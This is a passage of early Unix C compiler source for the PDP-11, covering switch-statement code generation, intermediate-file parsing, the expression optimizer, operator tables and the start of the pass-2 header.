	register struct instab *insp;
	register char *ip;

	for (insp=itable; insp->op != 0; insp++) {
		if (insp->op == op) {
			ip = c? insp->str2: insp->str1;
			if (ip==0)
				break;
			printf("%s", ip);
			return;
		}
	}
	error("No match' for op %d", op);
}

collcon(ap)
struct tnode *ap;
{
	register op;
	register struct tnode *p;

	p = ap;
	if (p->op==STAR)
		p = p->tr1;
	if (p->op==PLUS) {
		op = p->tr2->op;
		if (op==CON || op==AMPER)
			return(1);
	}
	return(0);
}

isfloat(at)
struct tnode *at;
{
	register struct tnode *t;

	t = at;
	if ((opdope[t->op]&RELAT)!=0)
		t = t->tr1;
	if (t->type==FLOAT || t->type==DOUBLE) {
		nfloat = 1;
		return('f');
	}
	return(0);
}

oddreg(t, areg)
struct tnode *t;
{
	register reg;

	reg = areg;
	if (!isfloat(t))
		switch(t->op) {
		case DIVIDE:
		case MOD:
		case ASDIV:
		case ASMOD:
			reg++;

		case TIMES:
		case ASTIMES:
			return(reg|1);
		}
	return(reg);
}

arlength(t)
{
	if (t>=PTR)
		return(2);
	switch(t) {

	case INT:
	case CHAR:
		return(2);

	case LONG:
		return(4);

	case FLOAT:
	case DOUBLE:
		return(8);
	}
	return(1024);
}

/*
 * Strings for switch code.
 */

char	dirsw[] {"\
cmp	r0,$%o\n\
jhi	L%d\n\
asl	r0\n\
jmp	*L%d(r0)\n\
.data\n\
L%d:\
" };

char	simpsw[] {"\
mov	$L%d,r1\n\
mov	r0,L%d\n\
L%d:cmp	r0,(r1)+\n\
jne	L%d\n\
jmp	*L%d-L%d(r1)\n\
.data\n\
L%d:\
"};

char	hashsw[] {"\
mov	r0,r1\n\
clr	r0\n\
div	$%o,r0\n\
asl	r1\n\
add	$L%d,r1\n\
mov	r0,*(r1)+\n\
mov	(r1)+,r1\n\
L%d:cmp	r0,-(r1)\n\
jne	L%d\n\
jmp	*L%d-L%d(r1)\n\
.data\n\
L%d:\
"};

pswitch(afp, alp, deflab)
struct swtab *afp, *alp;
{
	int tlab, ncase, i, j, tabs, worst, best, range;
	register struct swtab *swp, *fp, *lp;
	int poctab[swsiz];

	fp = afp;
	lp = alp;
	if (fp==lp) {
		printf("jbr	L%d\n", deflab);
		return;
	}
	tlab = isn++;
	if (sort(fp, lp))
		return;
	ncase = lp-fp;
	lp--;
	range = lp->swval - fp->swval;
	/* direct switch */
	if (range>0 && range <= 3*ncase) {
		if (fp->swval)
			printf("sub	$%o,r0\n", fp->swval);
		printf(dirsw, range, deflab, isn, isn);
		isn++;
		for (i=fp->swval; i<=lp->swval; i++) {
			if (i==fp->swval) {
				printf("L%d\n", fp->swlab);
				fp++;
			} else
				printf("L%d\n", deflab);
		}
		goto esw;
	}
	/* simple switch */
	if (ncase<8) {
		i = isn++;
		j = isn++;
		printf(simpsw, i, j, isn, isn, j, i, i);
		isn++;
		for (; fp<=lp; fp++)
			printf("%o\n", fp->swval);
		printf("L%d:..\n", j);
		for (fp = afp; fp<=lp; fp++)
			printf("L%d\n", fp->swlab);
		printf("L%d\n", deflab);
		goto esw;
	}
	/* hash switch */
	best = 077777;
	for (i=ncase/4; i<=ncase/2; i++) {
		for (j=0; j<i; j++)
			poctab[j] = 0;
		for (swp=fp; swp<=lp; swp++)
			poctab[lrem(0, swp->swval, i)]++;
		worst = 0;
		for (j=0; j<i; j++)
			if (poctab[j]>worst)
				worst = poctab[j];
		if (i*worst < best) {
			tabs = i;
			best = i*worst;
		}
	}
	i = isn++;
	printf(hashsw, tabs, isn, i, i, isn+tabs+1, isn+1, isn);
	isn++;
	for (i=0; i<=tabs; i++)
		printf("L%d\n", isn+i);
	for (i=0; i<tabs; i++) {
		printf("L%d:..\n", isn++);
		for (swp=fp; swp<=lp; swp++)
			if (lrem(0, swp->swval, tabs) == i)
				printf("%o\n", ldiv(0, swp->swval, tabs));
	}
	printf("L%d:", isn++);
	for (i=0; i<tabs; i++) {
		printf("L%d\n", deflab);
		for (swp=fp; swp<=lp; swp++)
			if (lrem(0, swp->swval, tabs) == i)
				printf("L%d\n", swp->swlab);
	}
esw:
	printf(".text\n");
}

sort(afp, alp)
struct swtab *afp, *alp;
{
	register struct swtab *cp, *fp, *lp;
	int intch, t;

	fp = afp;
	lp = alp;
	while (fp < --lp) {
		intch = 0;
		for (cp=fp; cp<lp; cp++) {
			if (cp->swval == cp[1].swval) {
				error("Duplicate case (%d)", cp->swval);
				return(1);
			}
			if (cp->swval > cp[1].swval) {
				intch++;
				t = cp->swval;
				cp->swval = cp[1].swval;
				cp[1].swval = t;
				t = cp->swlab;
				cp->swlab = cp[1].swlab;
				cp[1].swlab = t;
			}
		}
		if (intch==0)
			break;
	}
	return(0);
}

ispow2(atree)
{
	register int d;
	register struct tnode *tree;

	tree = atree;
	if (!isfloat(tree) && tree->tr2->op==CON) {
		d = tree->tr2->value;
		if (d>1 && (d&(d-1))==0)
			return(d);
	}
	return(0);
}

pow2(atree)
struct tnode *atree;
{
	register int d, i;
	register struct tnode *tree;

	tree = atree;
	if (d = ispow2(tree)) {
		for (i=0; (d=>>1)!=0; i++);
		tree->tr2->value = i;
		d = tree->op;
		tree->op = d==TIMES? LSHIFT:
			  (d==DIVIDE? RSHIFT:
			  (d==ASTIMES? ASLSH: ASRSH));
		tree = optim(tree);
	}
	return(tree);
}

cbranch(atree, albl, cond, areg)
struct tnode *atree;
{
	int l1, op;
	register lbl, reg;
	register struct tnode *tree;

	lbl = albl;
	reg = areg;
	if ((tree=atree)==0)
		return;
	switch(tree->op) {

	case LOGAND:
		if (cond) {
			cbranch(tree->tr1, l1=isn++, 0, reg);
			cbranch(tree->tr2, lbl, 1, reg);
			label(l1);
		} else {
			cbranch(tree->tr1, lbl, 0, reg);
			cbranch(tree->tr2, lbl, 0, reg);
		}
		return;

	case LOGOR:
		if (cond) {
			cbranch(tree->tr1, lbl, 1, reg);
			cbranch(tree->tr2, lbl, 1, reg);
		} else {
			cbranch(tree->tr1, l1=isn++, 1, reg);
			cbranch(tree->tr2, lbl, 0, reg);
			label(l1);
		}
		return;

	case EXCLA:
		cbranch(tree->tr1, lbl, !cond, reg);
		return;

	case COMMA:
		rcexpr(tree->tr1, efftab, reg);
		tree = tree->tr2;
		break;
	}
	op = tree->op;
	if (tree->type==LONG || opdope[op]&RELAT&&tree->tr1->type==LONG) {
		if (tree->type!=LONG) {
			tree->op = MINUS;
			tree->type = LONG;
			tree = optim(tree);
		} else
			op = NEQUAL;
		rcexpr(tree, regtab, 0);
		printf("ashc	$0,r0\n");
		branch(lbl, op, !cond);
		return;
	}
	rcexpr(tree, cctab, reg);
	op = tree->op;
	if ((opdope[op]&RELAT)==0)
		op = NEQUAL;
	else {
		l1 = tree->tr2->op;
	 	if ((l1==CON || l1==SFCON) && tree->tr2->value==0)
			op =+ 200;		/* special for ptr tests */
		else
			op = maprel[op-EQUAL];
	}
	if (isfloat(tree))
		printf("cfcc\n");
	branch(lbl, op, !cond);
}

branch(lbl, aop, c)
{
	register op;

	if(op=aop)
		prins(op, c, branchtab);
	else
		printf("jbr");
	printf("\tL%d\n", lbl);
}

label(l)
{
	printf("L%d:", l);
}

popstk(a)
{
	switch(a) {

	case 0:
		return;

	case 2:
		printf("tst	(sp)+\n");
		return;

	case 4:
		printf("cmp	(sp)+,(sp)+\n");
		return;
	}
	printf("add	$%o,sp\n", a);
}

error(s, p1, p2, p3, p4, p5, p6)
{
	register f;
	extern fout;

	nerror++;
	flush();
	f = fout;
	fout = 1;
	printf("%d: ", line);
	printf(s, p1, p2, p3, p4, p5, p6);
	putchar('\n');
	flush();
	fout = f;
}

psoct(an)
{
	register int n, sign;

	sign = 0;
	if ((n = an) < 0) {
		n = -n;
		sign = '-';
	}
	printf("%c%o", sign, n);
}

/*
 * Read in an intermediate file.
 */
getree()
{
	struct tnode *expstack[20];
	register struct tnode **sp;
	register t, op;
	static char s[9];
	struct swtab *swp;

	spacep = treespace;
	sp = expstack;
	for (;;) {
		if (sp >= &expstack[20])
			error("Stack botch");
		op = getw(ascbuf);
		if ((op&0177400) != 0177000) {
			error("Intermediate file error");
			exit(1);
		}
		switch(op =& 0377) {

	case EOF:
		return;

	case BDATA:
		printf(".byte ");
		seq(',');
		break;

	case WDATA:
		seq(';');
		break;

	case PROG:
		printf(".text\n");
		break;

	case DATA:
		printf(".data\n");
		break;

	case BSS:
		printf(".bss\n");
		break;

	case SYMDEF:
		printf(".globl	_%s\n", outname(s));
		break;

	case RETRN:
		printf("jmp	cret\n");
		break;

	case CSPACE:
		t = outname(s);
		printf(".comm	_%s,%o\n", t, getw(ascbuf));
		break;

	case SSPACE:
		printf(".=.+%o\n", getw(ascbuf));
		break;

	case EVEN:
		printf(".even\n");
		break;

	case SAVE:
		printf("jsr	r5,csv\n");
		t = getw(ascbuf)-6;
		if (t==2)
			printf("tst	-(sp)\n");
		else if (t > 2)
			printf("sub	$%o,sp\n", t);
		break;

	case PROFIL:
		t = getw(ascbuf);
		printf("mov	$L%d,r0\njsr	pc,mcount\n", t);
		printf(".bss\nL%d:.=.+2\n.text\n", t);
		break;

	case SNAME:
		t = outname(s);
		printf("~%s=L%d\n", t, getw(ascbuf));
		break;

	case ANAME:
		t = outname(s);
		printf("~%s=%o\n", t, getw(ascbuf));
		break;

	case RNAME:
		t = outname(s);
		printf("~%s=r%d\n", t, getw(ascbuf));
		break;

	case SWIT:
		t = getw(ascbuf);
		line = getw(ascbuf);
		swp = treespace;
		while (swp->swlab = getw(ascbuf)) {
			swp->swval = getw(ascbuf);
			swp++;
		}
		pswitch(treespace, swp, t);
		break;

	case EXPR:
		line = getw(ascbuf);
		if (sp != &expstack[1]) {
			error("Expression input botch\n");
			exit(1);
		}
		nstack = 0;
		rcexpr(optim(*--sp), efftab, 0);
		spacep = treespace;
		break;

	case NAME:
		t = getw(ascbuf);
		if (t==EXTERN) {
			t = getw(ascbuf);
			*sp = block(6, NAME, t, 0, EXTERN, 0, 0,0,0,0);
			outname(&(*sp)->nloc);
			sp++;
			break;
		}
		*sp = block(3, NAME, 0, 0, t, 0, 0);
		(*sp)->type = getw(ascbuf);
		(*sp)->nloc = getw(ascbuf);
		sp++;
		break;

	case CON:
	case SFCON:
	case FCON:
		t = getw(ascbuf);
		*sp++ = block(1, op, t, 0, getw(ascbuf));
		break;

	case FSEL:
		t = getw(ascbuf);
		sp[-1] = block(2, op, t, 0, sp[-1], getw(ascbuf));
		break;

	case NULL:
		*sp++ = block(0, 0, 0, 0);
		break;

	case CBRANCH:
		t = getw(ascbuf);
		sp[-1] = block(1, CBRANCH, sp[-1], t, getw(ascbuf));
		break;

	case LABEL:
		label(getw(ascbuf));
		break;

	case NLABEL:
		printf("_%s:\n", outname(s));
		break;

	case RLABEL:
		t = outname(s);
		printf("_%s:\n~~%s:\n", t, t);
		break;

	case BRANCH:
		branch(getw(ascbuf), 0);
		break;

	case SETREG:
		nreg = getw(ascbuf)-1;
		break;

	default:
		if (opdope[op]&BINARY) {
			if (sp < &expstack[1]) {
				error("Binary expression botch");
				exit(1);
			}
			t = *--sp;
			*sp++ = block(2, op, getw(ascbuf), 0, *--sp, t);
		} else {
			sp[-1] = block(1, op, getw(ascbuf), 0, sp[-1]);
		}
		break;
	}
	}
}

outname(s)
{
	register char *p, c;
	register n;

	p = s;
	n = 0;
	while (c = getc(ascbuf)) {
		*p++ = c;
		n++;
	}
	while (n++ < 8)
		*p++ = 0;
	return(s);
}

seq(c)
{
	register o;

	if (getw(ascbuf) == 0)
		return;
	for (;;) {
		printf("%o", getw(ascbuf));
		if ((o = getw(ascbuf)) != 1)
			break;
		printf("%c", c);
	}
	printf("\n");
}
-- /usr/source/c/c12.c mode=0110644 uid=10 gid=1 atime=174920535 mtime=174910923 --
#
/*
 *		C compiler part 2 -- expression optimizer
 *
 */

#include "c1h.c"

optim(atree)
struct tnode *atree;
{
	register op, dope;
	int d1, d2;
	struct tnode *t;
	register struct tnode *tree;

	if ((tree=atree)==0)
		return(0);
	if ((op = tree->op)==0)
		return(tree);
	if (op==NAME && tree->class==AUTO) {
		tree->class = OFFS;
		tree->regno = 5;
		tree->offset = tree->nloc;
	}
	dope = opdope[op];
	if ((dope&LEAF) != 0)
		return(tree);
	if ((dope&BINARY) == 0)
		return(unoptim(tree));
	/* is known to be binary */
	if (tree->type==CHAR)
		tree->type = INT;
	if ((dope&COMMUTE)!=0) {
	acomm:	d1 = tree->type;
		tree = acommute(tree);
		tree->type = d1;
		/*
		 * PDP-11 special:
		 * replace a&b by a NAND ~ b.
		 * This will be undone when in
		 * truth-value context.
		 */
		if (tree->op!=AND)
			return(tree);
		tree->op = NAND;
		tree->tr2 = block(1, COMPL, tree->tr2->type, 0, tree->tr2);
	}
    again:
	tree->tr1 = optim(tree->tr1);
	tree->tr2 = optim(tree->tr2);
	if ((dope&RELAT) != 0) {
		if ((d1=degree(tree->tr1)) < (d2=degree(tree->tr2))
		 || d1==d2 && tree->tr1->op==NAME && tree->tr2->op!=NAME) {
			t = tree->tr1;
			tree->tr1 = tree->tr2;
			tree->tr2 = t;
			tree->op = maprel[op-EQUAL];
		}
		if (tree->tr1->type==CHAR && tree->tr2->op==CON
		 && (dcalc(tree->tr1) <= 12 || tree->tr1->op==STAR)
		 && tree->tr2->value <= 127 && tree->tr2->value >= 0)
			tree->tr2->type = CHAR;
	}
	d1 = max(degree(tree->tr1), islong(tree->type));
	d2 = max(degree(tree->tr2), 0);
	if (tree->tr1->type==LONG && dope&RELAT)
		d1 = 10;
	switch (op) {

	case LTIMES:
	case LDIV:
	case LMOD:
	case LASTIMES:
	case LASDIV:
	case LASMOD:
		tree->degree = 10;
		break;

	/*
	 * PDP-11 special:
	 * generate new =&~ operator out of =&
	 * by complementing the RHS.
	 */
	case ASSAND:
		op = ASSNAND;
		tree->op = op;
		tree->tr2 = block(2, COMPL, tree->tr2->type, 0, tree->tr2);
		goto again;

	case NAND:
		if (isconstant(tree->tr2) && tree->tr2->value==0)
			return(tree->tr1);
		goto def;

	case CALL:
		tree->degree = 10;
		break;

	case QUEST:
	case COLON:
		tree->degree = max(d1, d2);
		break;

	case MINUS:
		if (t = isconstant(tree->tr2)) {
			tree->op = PLUS;
			if (t->type==DOUBLE)
				/* PDP-11 FP representation */
				t->value =^ 0100000;
			else
				t->value = -t->value;
			goto acomm;
		}
		goto def;

	case DIVIDE:
	case ASDIV:
	case ASTIMES:
		if (tree->tr2->op==CON && tree->tr2->value==1)
			return(tree->tr1);
		if (ispow2(tree) == 0) {

		case MOD:
		case ASMOD:
			d1 =+ 2;
			d2 =+ 2;
		}
		if (tree->type==LONG)
			return(hardlongs(tree));
		goto constant;

	case LSHIFT:
	case RSHIFT:
	case ASRSH:
	case ASLSH:
		if (tree->tr2->op==CON && tree->tr2->value==0)
			return(tree->tr1);
		/*
		 * PDP-11 special: turn right shifts into negative
		 * left shifts
		 */
		if (op==LSHIFT||op==ASLSH)
			goto constant;
		if (tree->tr2->op==CON && tree->tr2->value==1)
			goto constant;
		op =+ (LSHIFT-RSHIFT);
		tree->op = op;
		tree->tr2 = block(1, NEG, tree->type, 0, tree->tr2);
		goto again;

	constant:
		if (tree->tr1->op==CON && tree->tr2->op==CON) {
			const(op, &tree->tr1->value, tree->tr2->value);
			return(tree->tr1);
		}


	def:
	default:
		tree->degree = d1==d2? d1+islong(tree->type): max(d1, d2);
		break;
	}
	return(tree);
}

unoptim(atree)
struct tnode *atree;
{
	register struct tnode *subtre, *tree;
	register int *p;
	double static fv;
	struct { int integer; };

	if ((tree=atree)==0)
		return(0);
	if (tree->op==CBRANCH) {
		tree->btree = optim(tree->btree);
		return(tree);
	}
	subtre = tree->tr1 = optim(tree->tr1);
	switch (tree->op) {

	case FSEL:
		tree->tr1 = block(2, RSHIFT, INT, 0, subtre,
		    block(1, CON, INT, 0, tree->bitoffs));
		tree->op = AND;
		tree->type = INT;
		tree->tr2 = block(1, CON, INT, 0, (1<<tree->flen)-1);
		return(optim(tree));

	case AMPER:
		if (subtre->op==STAR)
			return(subtre->tr1);
		if (subtre->op==NAME && subtre->class == OFFS) {
			p = block(2, PLUS, tree->type, 1, subtre, tree);
			subtre->type = tree->type;
			tree->op = CON;
			tree->type = INT;
			tree->degree = 0;
			tree->value = subtre->offset;
			subtre->class = REG;
			subtre->nloc = subtre->regno;
			subtre->offset = 0;
			return(p);
		}
		break;

	case STAR:
		if (subtre->op==AMPER)
			return(subtre->tr1);
		if (subtre->op==NAME && subtre->class==REG) {
			subtre->type = tree->type;
			subtre->class = OFFS;
			subtre->regno = subtre->nloc;
			return(subtre);
		}
		p = subtre->tr1;
		if ((subtre->op==INCAFT||subtre->op==DECBEF)&&tree->type!=LONG
		 && p->op==NAME && p->class==REG && p->type==subtre->type) {
			p->type = tree->type;
			p->op = subtre->op==INCAFT? AUTOI: AUTOD;
			return(p);
		}
		if (subtre->op==PLUS && p->op==NAME && p->class==REG) {
			if (subtre->tr2->op==CON) {
				p->offset =+ subtre->tr2->value;
				p->class = OFFS;
				p->type = tree->type;
				p->regno = p->nloc;
				return(p);
			}
			if (subtre->tr2->op==AMPER) {
				subtre = subtre->tr2->tr1;
				subtre->class =+ XOFFS-EXTERN;
				subtre->regno = p->nloc;
				subtre->type = tree->type;
				return(subtre);
			}
		}
		break;
	case EXCLA:
		if ((opdope[subtre->op]&RELAT)==0)
			break;
		tree = subtre;
		tree->op = notrel[tree->op-EQUAL];
		break;

	case NEG:
	case COMPL:
		if (tree->type==CHAR)
			tree->type = INT;
		if (tree->op == subtre->op)
			return(subtre->tr1);
		if (subtre->op==ITOL) {
			subtre->op = tree->op;
			subtre->type = INT;
			tree->op = ITOL;
		}
	}
	if (subtre->op == CON) switch(tree->op) {

	case NEG:
		subtre->value = -subtre->value;
		return(subtre);

	case COMPL:
		subtre->value = ~subtre->value;
		return(subtre);

	case ITOF:
		fv = subtre->value;
		p = &fv;
		p++;
		if (*p++==0 && *p++==0 && *p++==0) {
			subtre->type = DOUBLE;
			subtre->value = fv.integer;
			subtre->op = SFCON;
			return(subtre);
		}
		break;
	}
	tree->degree = max(islong(tree->type), degree(subtre));
	return(tree);
}

struct acl {
	int nextl;
	int nextn;
	struct tnode *nlist[20];
	struct tnode *llist[21];
};

acommute(atree)
{
	struct acl acl;
	int d, i, op, flt;
	register struct tnode *t1, **t2, *tree;
	struct tnode *t;

	acl.nextl = 0;
	acl.nextn = 0;
	tree = atree;
	op = tree->op;
	flt = isfloat(tree);
	insert(op, tree, &acl);
	acl.nextl--;
	t2 = &acl.llist[acl.nextl];
	if (!flt) {
		/* put constants together */
		for (i=acl.nextl;i>0&&t2[0]->op==CON&&t2[-1]->op==CON;i--) {
			acl.nextl--;
			t2--;
			const(op, &t2[0]->value, t2[1]->value);
		}
	}
	if (op==PLUS || op==OR) {
		/* toss out "+0" */
		if (acl.nextl>0 && (t1 = isconstant(*t2)) && t1->value==0) {
			acl.nextl--;
			t2--;
		}
		if (acl.nextl <= 0)
			return(*t2);
		/* subsume constant in "&x+c" */
		if (op==PLUS && t2[0]->op==CON && t2[-1]->op==AMPER) {
			t2--;
			t2[0]->tr1->offset =+ t2[1]->value;
			acl.nextl--;
		}
	} else if (op==TIMES || op==AND) {
		t1 = acl.llist[acl.nextl];
		if (t1->op==CON) {
			if (t1->value==0)
				return(t1);
			if (op==TIMES && t1->value==1 && acl.nextl>0)
				if (--acl.nextl <= 0)
					return(acl.llist[0]);
		}
	}
	if (op==PLUS && !flt)
		distrib(&acl);
	tree = *(t2 = &acl.llist[0]);
	d = max(degree(tree), islong(tree->type));
	if (op==TIMES && !flt)
		d++;
	for (i=0; i<acl.nextl; i++) {
		t1 = acl.nlist[i];
		t1->tr2 = t = *++t2;
		t1->degree = d = d==degree(t)? d+islong(t1->type): max(d, degree(t));
		t1->tr1 = tree;
		tree = t1;
		if (tree->type==LONG) {
			if (tree->op==TIMES)
				tree = hardlongs(tree);
			else if (tree->op==PLUS && (t = isconstant(tree->tr1))
			       && t->value < 0) {
				tree->op = MINUS;
				t->value = - t->value;
				t = tree->tr1;
				tree->tr1 = tree->tr2;
				tree->tr2 = t;
			}
		}
	}
	if (tree->op==TIMES && ispow2(tree))
		tree->degree = max(degree(tree->tr1), islong(tree->type));
	return(tree);
}

distrib(list)
struct acl *list;
{
/*
 * Find a list member of the form c1c2*x such
 * that c1c2 divides no other such constant, is divided by
 * at least one other (say in the form c1*y), and which has
 * fewest divisors. Reduce this pair to c1*(y+c2*x)
 * and iterate until no reductions occur.
 */
	register struct tnode **p1, **p2;
	struct tnode *t;
	int ndmaj, ndmin;
	struct tnode **dividend, **divisor;
	struct tnode **maxnod, **mindiv;

    loop:
	maxnod = &list->llist[list->nextl];
	ndmaj = 1000;
	dividend = 0;
	for (p1 = list->llist; p1 <= maxnod; p1++) {
		if ((*p1)->op!=TIMES || (*p1)->tr2->op!=CON)
			continue;
		ndmin = 0;
		for (p2 = list->llist; p2 <= maxnod; p2++) {
			if (p1==p2 || (*p2)->op!=TIMES || (*p2)->tr2->op!=CON)
				continue;
			if ((*p1)->tr2->value == (*p2)->tr2->value) {
				(*p2)->tr2 = (*p1)->tr1;
				(*p2)->op = PLUS;
				(*p1)->tr1 = (*p2);
				*p1 = optim(*p1);
				squash(p2, maxnod);
				list->nextl--;
				goto loop;
			}
			if (((*p2)->tr2->value % (*p1)->tr2->value) == 0)
				goto contmaj;
			if (((*p1)->tr2->value % (*p2)->tr2->value) == 0) {
				ndmin++;
				mindiv = p2;
			}
		}
		if (ndmin > 0 && ndmin < ndmaj) {
			ndmaj = ndmin;
			dividend = p1;
			divisor = mindiv;
		}
    contmaj:;
	}
	if (dividend==0)
		return;
	t = list->nlist[--list->nextn];
	p1 = dividend;
	p2 = divisor;
	t->op = PLUS;
	t->type = (*p1)->type;
	t->tr1 = (*p1);
	t->tr2 = (*p2)->tr1;
	(*p1)->tr2->value =/ (*p2)->tr2->value;
	(*p2)->tr1 = t;
	t = optim(*p2);
	if (p1 < p2) {
		*p1 = t;
		squash(p2, maxnod);
	} else {
		*p2 = t;
		squash(p1, maxnod);
	}
	list->nextl--;
	goto loop;
}

squash(p, maxp)
struct tnode **p, **maxp;
{
	register struct tnode **np;

	for (np = p; np < maxp; np++)
		*np = *(np+1);
}

const(op, vp, av)
int *vp;
{
	register int v;

	v = av;
	switch (op) {

	case PLUS:
		*vp =+ v;
		return;

	case TIMES:
		*vp =* v;
		return;

	case AND:
		*vp =& v;
		return;

	case OR:
		*vp =| v;
		return;

	case EXOR:
		*vp =^ v;
		return;

	case DIVIDE:
	case MOD:
		if (v==0)
			error("Divide check");
		else
			if (op==DIVIDE)
				*vp =/ v;
			else
				*vp =% v;
		return;

	case RSHIFT:
		*vp =>> v;
		return;

	case LSHIFT:
		*vp =<< v;
		return;

	case NAND:
		*vp =& ~ v;
		return;
	}
	error("C error: const");
}

insert(op, atree, alist)
struct acl *alist;
{
	register d;
	register struct acl *list;
	register struct tnode *tree;
	int d1, i;
	struct tnode *t;

	tree = atree;
	list = alist;
	if (tree->op == op) {
	ins:	list->nlist[list->nextn++] = tree;
		insert(op, tree->tr1, list);
		insert(op, tree->tr2, list);
		return;
	}
	tree = optim(tree);
	if (tree->op == op)
		goto ins;
	if (!isfloat(tree)) {
		/* c1*(x+c2) -> c1*x+c1*c2 */
		if ((tree->op==TIMES||tree->op==LSHIFT)
		  && tree->tr2->op==CON && tree->tr2->value>0
		  && tree->tr1->op==PLUS && tree->tr1->tr2->op==CON) {
			d = tree->tr2->value;
			if (tree->op==TIMES)
				tree->tr2->value =* tree->tr1->tr2->value;
			else
				tree->tr2->value = tree->tr1->tr2->value << d;
			tree->tr1->tr2->value = d;
			tree->tr1->op = tree->op;
			tree->op = PLUS;
			if (op==PLUS)
				goto ins;
		}
	}
	d = degree(tree);
	for (i=0; i<list->nextl; i++) {
		if ((d1=degree(list->llist[i]))<d) {
			t = list->llist[i];
			list->llist[i] = tree;
			tree = t;
			d = d1;
		}
	}
	list->llist[list->nextl++] = tree;
}

block(an, args)
{
	register int *p;
	int *oldp;
	register *argp, n;

	oldp = p = spacep;
	n = an+3;
	argp = &args;
	do
		*p++ = *argp++;
	while (--n);
	if (p >= &treespace[ossiz]) {
		error("Exp. ov. pass 2");
		exit(1);
	}
	spacep = p;
	return(oldp);
}

islong(t)
{
	if (t==LONG)
		return(2);
	return(1);
}

isconstant(at)
struct tnode *at;
{
	register struct tnode *t;

	t = at;
	if (t->op==CON || t->op==SFCON)
		return(t);
	if (t->op==ITOL && t->tr1->op==CON)
		return(t->tr1);
	return(0);
}

hardlongs(at)
struct tnode *at;
{
	register struct tnode *t;

	t = at;
	switch(t->op) {

	case TIMES:
	case DIVIDE:
	case MOD:
		t->op =+ LTIMES-TIMES;
		break;

	case ASTIMES:
	case ASDIV:
	case ASMOD:
		t->op =+ LASTIMES-ASTIMES;
		t->tr1 = block(1, AMPER, LONG+PTR, 0, t->tr1);
		break;

	default:
		return(t);
	}
	return(optim(t));
}
-- /usr/source/c/c13.c mode=0100644 uid=10 gid=1 atime=174920557 mtime=174910915 --
int opdope[] {
	000000,	/* EOF */
	000000,	/* ; */
	000000,	/* { */
	000000,	/* } */
	036000,	/* [ */
	002000,	/* ] */
	036000,	/* ( */
	002000,	/* ) */
	014201,	/* : */
	007001,	/* , */
	000000,	/* field selection */
	000000,	/* 11 */
	000000,	/* 12 */
	000000,	/* 13 */
	000000,	/* 14 */
	000000,	/* 15 */
	000000,	/* 16 */
	000000,	/* 17 */
	000000,	/* 18 */
	000000,	/* 19 */
	000400,	/* name */
	000400,	/* short constant */
	000400,	/* string */
	000400,	/* float */
	000400,	/* double */
	000000,	/* 25 */
	000000,	/* 26 */
	000400,	/* autoi, *r++ */
	000400,	/* autod, *--r */
	000000,	/* 29 */
	034203,	/* ++pre */
	034203,	/* --pre */
	034203,	/* ++post */
	034203,	/* --post */
	034220,	/* !un */
	034202,	/* &un */
	034220,	/* *un */
	034200,	/* -un */
	034220,	/* ~un */
	036001,	/* . (structure reference) */
	030101,	/* + */
	030001,	/* - */
	032101,	/* * */
	032001,	/* / */
	032001,	/* % */
	026061,	/* >> */
	026061,	/* << */
	020161,	/* & */
	016161,	/* | */
	016161,	/* ^ */
	036001,	/* -> */
	001000,	/* int -> double */
	001000,	/* double -> int */
	000001,	/* && */
	000001,	/* || */
	030001, /* &~ */
	001000,	/* double -> long */
	001000,	/* long -> double */
	001000,	/* integer -> long */
	001000,	/* long -> integer */
	022005,	/* == */
	022005,	/* != */
	024005,	/* <= */
	024005,	/* < */
	024005,	/* >= */
	024005,	/* > */
	024005,	/* <p */
	024005,	/* <=p */
	024005,	/* >p */
	024005,	/* >=p */
	012213,	/* =+ */
	012213,	/* =- */
	012213,	/* =* */
	012213,	/* =/ */
	012213,	/* =% */
	012253,	/* =>> */
	012253,	/* =<< */
	012253,	/* =& */
	012253,	/* =| */
	012253,	/* =^ */
	012213,	/* = */
	030001, /* & for tests */
	032101,	/*  * (long) */
	032001,	/*  / (long) */
	032001,	/* % (long) */
	012253,	/* =& ~ */
	012213,	/* =* (long) */
	012213,	/* / (long) */
	012213,	/* % (long) */
	000000,	/* 89 */
	014201,	/* ? */
	026061,	/* long << */
	012253,	/* long =<< */
	000000,	/* 93 */
	000000,	/* 94 */
	000000,	/* 95 */
	000000,	/* 96 */
	000000,	/* 97 */
	000000,	/* 98 */
	000000,	/* 99 */
	036001,	/* call */
	036000,	/* mcall */
	000000,	/* goto */
	000000,	/* jump cond */
	000000,	/* branch cond */
	000400,	/* set nregs */
	000000, /* 106 */
	000000,	/* 107 */
	000000,	/* 108 */
	000000,	/* 109 */
	000000	/* force r0 */
};

char	*opntab[] {
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	":",
	",",
	"field select",
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	"name",
	"short constant",
	"string",
	"float",
	"double",
	0,
	0,
	"*r++",
	"*--r",
	0,
	"++pre",
	"--pre",
	"++post",
	"--post",
	"!un",
	"&",
	"*",
	"-",
	"~",
	".",
	"+",
	"-",
	"*",
	"/",
	"%",
	">>",
	"<<",
	"&",
	"|",
	"^",
	"->",
	"int->double",
	"double->int",
	"&&",
	"||",
	"&~",
	"double->long",
	"long->double",
	"integer->long",
	"long->integer",
	"==",
	"!=",
	"<=",
	"<",
	">=",
	">",
	"<p",
	"<=p",
	">p",
	">=p",
	"=+",
	"=-",
	"=*",
	"=/",
	"=%",
	"=>>",
	"=<<",
	"=&",
	"=|",
	"=^",
	"=",
	"& for tests",
	"*",
	"/",
	"%",
	"=& ~",
	"=*",
	"=/",
	"=%",
	0,
	"?",
	"<<",
	"=<<",
	0,
	0,
	0,
	0,
	0,
	"call",
	"call",
	"call",
	0,
	"goto",
	"jump cond",
	"branch cond",
	"set nregs",
	"load value",
	0,
	0,
	0,
	"force register"
};
-- /usr/source/c/c1h.c mode=0100644 uid=10 gid=1 atime=174920533 mtime=174910917 --
/*
 *	C pass 2 header
 */

#define	swsiz	200
#define	ossiz	500

struct	tnode {
	int	op;
	int	type;
	int	degree;
	struct	tnode *tr1, *tr2;
};

struct	bnode {
	int	bop;
	struct	tnode *btree;
	int	lbl;
	int	cond;
};

struct	tname {
	int	nop;
	int	ntype;
	int	elsize;
	char	class;
	char	regno;
	int	offset;
	int	nloc;
};

/*
 * for field selections
 */
struct tsel {
	int	op;
	int	type;
	int	degree;
	struct	tnode *tr1;
	char	flen;
	char	bitoffs;
};

struct	tconst {
	int	cop;
	int	ctype;
	int	cdeg;
	int	value;
};

struct	optab {
	char	tabdeg1;
	char	tabtyp1;
	char	tabdeg2;
	char	tabtyp2;
	char	*tabstring;
};

struct	table {
	int	tabop;
	struct	optab *tabp;
};

struct	instab {
	int	iop;
	char	*str1;
